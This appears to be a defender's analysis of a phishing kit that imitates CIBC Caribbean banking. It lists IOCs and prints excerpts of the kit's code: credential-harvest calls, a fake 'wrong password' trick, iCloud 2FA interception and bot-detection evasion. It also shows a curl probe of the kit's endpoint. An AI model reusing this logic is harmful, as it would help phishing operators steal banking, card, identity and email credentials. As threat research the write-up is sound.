# cibccaribbeanid.icu Phishing Site Analysis

## What It Is

Phishing site impersonating **CIBC Caribbean Online Banking**. The page title
uses Unicode lookalike characters (`СIВС Саribbеаn - ОnIinе Ваnking`) to
spoof the real brand. Included `noindex, nofollow` meta tag to avoid search
engine indexing.

## How We Got Here

![initial text I got](/text.png)

### 1. WhoIs Lookup

| Field | Value |
|---|---|
| Domain | `cibccaribbeanid.icu` |
| Registered | 2026-05-29 (same day as writeup) |
| Registrar | PDR Ltd. / PublicDomainRegistry |
| Host IP | `188.166.36.41` |
| Host ASN | AS14061 — DigitalOcean, Amsterdam |
| Registrar abuse | `abuse@publicdomainregistry.com` |
| Host abuse | `abuse@digitalocean.com` |


### 2. Initial fetch

Fetched `/` impersonating Chrome. Got the anti-bot decoy page (here's a snippet):

  ```html
      <body class="ng-scope desktop-view mobile-browser theme--light">
          <main style="padding: 40px; font-family: system-ui">
              <h1>Access not allowed</h1>
              <p>Automated traffic is not permitted on this site.</p>
          </main>
          ...
          <script>
              self.__next_f.push([
                  1,
                  '1:"$Sreact.fragment"\n2:I[5429,["509","static/chunks/509-3e5877b939fd87a8.js","177","static/chunks/app/layout-502b8f3b4c8af488.js"],"default"]...'
              ]);
          </script>
  ```
  
  Seems like a Next.js RSC-rendered page that shows "Access not allowed".
  
  Hidden in the RSC payload was the Next.js build ID `jS7HLfsNPkrJunzq3p8j-` and the current route `not-allowed`:
  
  ```json
  {"b":"jS7HLfsNPkrJunzq3p8j-", "c":["","not-allowed"]}
  ```

### 3. Enumerating Build Manifest

Fetched `/_next/static/jS7HLfsNPkrJunzq3p8j-/_buildManifest.js`. It's a
Pages Router manifest with only `/_app` and `/_error`. The real app uses App Router, so routes aren't exposed here.

### 4. JS chunk download & analysis (`recon.py`)

Downloaded all 8 JS chunks referenced in the HTML.
Key findings from `app/layout-502b8f3b4c8af488.js`:

```js
sitekey: u.env.NEXT_PUBLIC_RECAPTCHA_SITE_KEY || "6Lew2fkrAAAAAOmRUFxLnGjTwki1ex0MMCvtAqYS",
size: "invisible",
```

- Site wraps the entire app in a `RecaptchaProvider` using **invisible reCAPTCHA** (`size="invisible"`).
- Hardcoded fallback site key: `6Lew2fkrAAAAAOmRUFxLnGjTwki1ex0MMCvtAqYS`
- The token flow: reCAPTCHA fires silently → token sent to server → middleware validates → allow or block.

The largest CSS file (`6ec1c51b335e5fa2.css`, 689 KB) contains Angular
component attribute selectors (`[_ngcontent-qea-c664]`). This is the real
CIBC Caribbean banking app's compiled CSS, **stolen wholesale**. Fonts are
self-hosted at `/fonts/external/googlesans/` and `/fonts/external/yahoo/`.

Discovered the middleware has at least two response branches based on IP reputation/geo:

| IP type | `GET /` | `GET /login` |
|---|---|---|
| Real residential IP | Middleware **rewrites** to `/not-allowed`, serves decoy RSC page | 308 → `/login` (with bypass) |
| VPN/datacenter IP | 308 redirect to `/login` | 405 "Not Allowed" (all methods, plain text) |

The 405 on `/login` for all methods with no `Allow` header and a custom
`text/plain` body is a second middleware block, not a real Next.js route 405.

---

## Key IOCs

| Type | Value |
|---|---|
| Domain | `cibccaribbeanid.icu` |
| IP | `188.166.36.41` |
| reCAPTCHA site key | `6Lew2fkrAAAAAOmRUFxLnGjTwki1ex0MMCvtAqYS` |
| Next.js build ID | `jS7HLfsNPkrJunzq3p8j-` |
| Stolen CSS fingerprint | `[_ngcontent-qea-c664]` Angular scoped selectors |
| Title spoof | Unicode homoglyphs in `СIВС Саribbеаn - ОnIinе Ваnking` |

## App Structure

- **Framework:** Next.js (App Router + Pages Router hybrid)
- **Anti-bot:** Invisible reCAPTCHA v2 + IP/geo middleware layer
- **Real login route:** `/login` (gated; not served to bots or VPN IPs)
- **CSS source:** Stolen from real CIBC Caribbean Angular SPA
- **Self-hosted assets:** Google Sans, Yahoo Sans fonts at `/fonts/external/`

---

## Full Phishing Data Harvest

All fields collected across the multi-step flow:

| Step | Route | Fields harvested |
|---|---|---|
| Login | `/[id]/login` | `username` (User ID), `password` |
| Card | `/[id]/card` | `cardNumber`, `expirationDate`, `cvv` |
| Billing | `/[id]/billing` | `fullname`, `dob`, `phoneNumber`, `address` |
| Email | `/[id]/email` | `email`, `phoneNumber` |
| Document | `/[id]/document` | `front` (ID photo), `back` (ID photo) |
| OTP | `/[id]/otp` | live 2FA/OTP code for account takeover |
| Email login | `/email/{provider}` | victim's Gmail / Outlook / Yahoo / iCloud credentials |

Total exfil per victim: banking credentials, full card details, PII (name/DOB/address/phone), government ID photos, OTP codes, and email account password.

## Route Discovery: Middleware Bypass via `/api/` prefix

The Next.js middleware blocks pretty URLs (`/login`, `/card`, etc.) but the
App Router uses a dynamic segment `[id]` — so accessing `/api/login` passes
`"api"` as the `[id]` parameter and completely bypasses the middleware.

All pages accessible via `/api/*`:

| URL | Size | Notes |
|---|---|---|
| `/api/login` | 18 KB | Login form |
| `/api/card` | 17 KB | Card details form |
| `/api/otp` | 641 KB | OTP entry (includes all shared components) |
| `/api/email` | 16 KB | Email + phone form |
| `/api/billing` | 17 KB | PII collection form |
| `/api/document` | 17 KB | ID photo upload (front + back) |
| `/api/confirmation` | 15 KB | Final "thank you" page |
| `/api/block` | — | 308 → `https://localhost:3000/not-allowed` (OPSEC leak) |

## Server Action (Credential Submission Endpoint)

All form submissions call a single **Next.js Server Action** via:
```
POST /{page}
Next-Action: 7fbd36e5371f9b7bf4658498f5c0d2e205e3c568fa
Content-Type: text/plain;charset=UTF-8

["LOGIN", {"logins":{"1":{...}}, "sessionId":"...", "recaptchaToken":"..."}]
```

- The reCAPTCHA token is **not validated server-side** — tested by sending a
  dummy token and receiving `{"sent":true}`.
- The action ID `7fbd36e5371f9b7bf4658498f5c0d2e205e3c568fa` is shared across
  all pages. Event types: `LOGIN`, `CARD`, `EMAIL & MOBILE`, `OTP`, `BILLING`,
  `DOCUMENT`, `CONFIRMATION`.
- Exfil destination is server-side only — not visible in client JS.

## Email Provider Fingerprinting

After the victim submits their email address, the site performs a
DNS-over-HTTPS MX lookup:
```
GET https://cloudflare-dns.com/dns-query?name={domain}&type=MX
```
The result routes the victim to a provider-specific fake inbox login:
`/email/gmail`, `/email/live`, `/email/yahoo`, `/email/icloud`, `/email/aol`.

## OPSEC Failures

| Finding | Significance |
|---|---|
| `/api/block` → `https://localhost:3000/not-allowed` | Dev redirect URL never changed; confirms direct Node.js hosting |
| Email helper text: "associated with your **PNC account(s)**" | Copy-paste from a PNC Bank phishing template; kit is not purpose-built |
| Hardcoded reCAPTCHA key `6Lew2fkrAAAAAOmRUFxLnGjTwki1ex0MMCvtAqYS` | Key exposed in client JS as fallback |
| Server Action accepts any reCAPTCHA token | No server-side validation |

## Client-Side Bot Detection (module 8066 in `211-98290cf7eeb904d8.js`)

```js
function o() {
    let e = [];
    true === navigator.webdriver && e.push("webdriver");
    navigator.languages && 0 !== navigator.languages.length || e.push("no-languages");
    let n = /Mobile|iPhone|Android/.test(navigator.userAgent);
    n && 0 === navigator.maxTouchPoints && e.push("touch-mismatch");
    let a = document.createElement("canvas").getContext("webgl");
    if (a) {
        let t = a.getExtension("WEBGL_debug_renderer_info");
        let c = t ? a.getParameter(t.UNMASKED_RENDERER_WEBGL) : "";
        /SwiftShader|llvmpipe|Mesa Offscreen/i.test(c) && e.push("software-gpu");
        n && /NVIDIA|AMD|Intel.*HD/i.test(c) && e.push("desktop-gpu-on-mobile-ua");
    }
    setTimeout(() => {
        if (e.length !== 0 && !interacted)
            window.location.replace("/api/block?r=" + encodeURIComponent(e.join(",")));
    }, 4000); // <-- the 4 second timer
}
```

The site runs a fingerprinter 4 seconds after page load and redirects to
`/api/block` if any of the following are true:
- `navigator.webdriver === true` (Selenium / Playwright)
- No browser languages set
- Mobile UA but zero touch points
- Software GPU renderer (SwiftShader, llvmpipe, Mesa)
- Desktop GPU on mobile UA
- No mouse / touch / keyboard interaction in 4 seconds

---

## Fake Email Provider Login Pages

After the victim submits their email address on the `/email` step, the site
figures out what email provider they use and serves a pixel-perfect clone of
that provider's login page.

### How the provider is detected

```js
async function detectProvider(domain) {
    const map = {
        gmail: 'gmail', aol: 'aol', yahoo: 'yahoo', ymail: 'yahoo',
        outlook: 'outlook', hotmail: 'outlook', live: 'outlook',
        icloud: 'icloud', me: 'icloud',
    };
    const tld = domain.split('.')[0];
    if (map[tld]) return map[tld];

    // For anything not in the list, fire a real DNS-over-HTTPS MX lookup
    const res = await fetch(
        `https://cloudflare-dns.com/dns-query?name=${domain}&type=MX`,
        { headers: { Accept: 'application/dns-json' } }
    );
    const { Answer = [] } = await res.json();
    if (Answer.some(r => r.data.toLowerCase().includes('google.com')))
        return 'gmail';

    return 'outlook'; // fallback
}

router.push(`/email/${provider}`);
```

The DoH lookup catches custom-domain Gmail users (e.g. `@mycompany.com`
routed through Google Workspace) who wouldn't be caught by the hardcoded map.

---

### Provider pages discovered

| Provider | URL | Chunk size | Notes |
|---|---|---|---|
| Gmail | `/api/email/gmail` | 1.07 MB | Google `quantumWiz` CSS inlined |
| Yahoo | `/api/email/yahoo` | 723 KB | Yahoo Sans fonts from `yimg.com` |
| iCloud | `/api/email/icloud` | 3.3 MB | Full Apple UI + 2FA interception |
| AOL | `/api/email/aol` | 722 KB | Same template as Yahoo |
| Live/Hotmail | `/api/email/live` | 116 KB | Hardcoded Microsoft PPFT token |
| Outlook | `/api/email/outlook` | 404 | Not implemented |

---

### Gmail clone

The Gmail fake login uses the **exact same obfuscated CSS class names** as the
real Google login page — `VfPpkd-*`, `quantumWizBoxInkSpread`, etc. These are
Google's minified Material Design class names. The page cannot be visually
distinguished from the real thing.

Google's real field names are used verbatim:

```html
<input name="identifier" type="email" />  <!-- step 1: email address -->
<input name="Passwd"     type="password" />  <!-- step 2: password -->
```

**The "wrong password" trick** — on the *first* submit, the kit deliberately
displays a fake error for 2 seconds before advancing:

```js
const onSubmit = async ({ email, password }) => {
    await sendData("EMAIL", {
        emailLogins: { [attempt + 1]: { email, password } },
        sessionId,
        recaptchaToken,
    });

    if (attempt === 0) {
        // Show "Wrong password. Try again." then reset so victim enters again
        setTimeout(() => { setStep(1); resetForm(); }, 2000);
        return;
    }

    // Second attempt: proceed to next step
    const nextStep = getFlow()[ getFlow().indexOf("EMAIL") + 1 ];
    router.push( routeMap(nextStep) );
};
```

Both attempts are sent to the attacker (`emailLogins[1]` and `emailLogins[2]`).

Error message shown to victim:
> *"Wrong password. Try again or click Forgot password to reset it."*

---

### iCloud clone

The iCloud page is the most sophisticated at **3.3 MB** — it includes Apple's
actual compiled CSS (complete with Apple's copyright header), the full Apple
ID sign-in flow, and **live 2FA interception**.

What the page does:

1. **Step 1** — captures Apple ID (email/phone) + password, sends as `"EMAIL"` event.
2. **Step 2** — shows a "Two-Factor Authentication" screen identical to Apple's,
   intercepts the 6-digit code, sends as `"EMAIL OTP"` event.

```js
await sendData("EMAIL OTP", { emailOtp: code, sessionId });
```

When the victim clicks **"Text code to ••• ••• ••••"** or **"Get a call"**,
the kit sends a tracking event so the attacker knows which delivery method
the victim is using — letting them time their own login attempt accordingly:

```js
await sendData("INFO", { info: "ICLOUD, text code", sessionId });
await sendData("INFO", { info: "ICLOUD, call for code", sessionId });
```

---

### Live / Hotmail clone

The Microsoft page has a **hardcoded PPFT token** baked into the static JS:

```html
<input type="hidden" name="PPFT" value="-DsmrEKmaclylMa!Tfd6sr3...NnQ$$" />
```

`PPFT` is Microsoft's CSRF/session token. It was captured from a real
Microsoft login page at build time and frozen in. It will have expired by the
time victims see it — the form never actually submits to Microsoft. It's
purely cosmetic to make the DOM match the real site.

---

### Summary: single Server Action handles everything

Every form submission — banking login, card details, PII, ID photos, OTP,
and all five fake email logins — calls the same Next.js Server Action:

```
Action ID : 7fbd36e5371f9b7bf4658498f5c0d2e205e3c568fa
```

| Event string | Data sent |
|---|---|
| `"LOGIN"` | `{logins: {1: {username, password}}}` |
| `"CARD"` | `{cardDetails: {cardNumber, expirationDate, cvv}}` |
| `"EMAIL & MOBILE"` | `{email, phoneNumber}` |
| `"EMAIL"` | `{emailLogins: {1: {email, password}}}` |
| `"EMAIL OTP"` | `{emailOtp: "123456"}` |
| `"INFO"` | `{info: "ICLOUD, text code"}` (tracking only) |
| `"BILLING"` | `{fullname, dob, phoneNumber, address}` |
| `"DOCUMENT"` | `{front: <base64>, back: <base64>}` |
| `"OTP"` | `{otp: "123456"}` |

Because the reCAPTCHA token is **never validated server-side**, this endpoint
can be called directly with any token value and returns `{"sent":true}`:

```bash
curl -s https://cibccaribbeanid.icu/api/login \
  -H 'Content-Type: text/plain;charset=UTF-8' \
  -H 'Next-Action: 7fbd36e5371f9b7bf4658498f5c0d2e205e3c568fa' \
  -d '["LOGIN",{"logins":{"1":{"username":"test","password":"test"}},"sessionId":"AAAAAAAAAA","recaptchaToken":"anything"}]'
# Response: 0:{"a":"$@1","f":"","b":"jS7HLfsNPkrJunzq3p8j-"}\n1:{"sent":true}
```

---

## Remaining Unknowns

- **Exfil destination**: where `{"sent":true}` sends data. The destination is
  server-side only and not visible in any client JS — could be Telegram, email,
  a database, or a webhook
- **`/email/outlook`** — not implemented (404); no Outlook-specific page exists
- **Real campaign IDs**: what `[id]` values victims receive in phishing URLs
  (e.g. `/xyz123/login`)
- **Server-side source**: the Next.js app is running directly on
  `188.166.36.41:3000` behind whatever reverse proxy; source not accessible
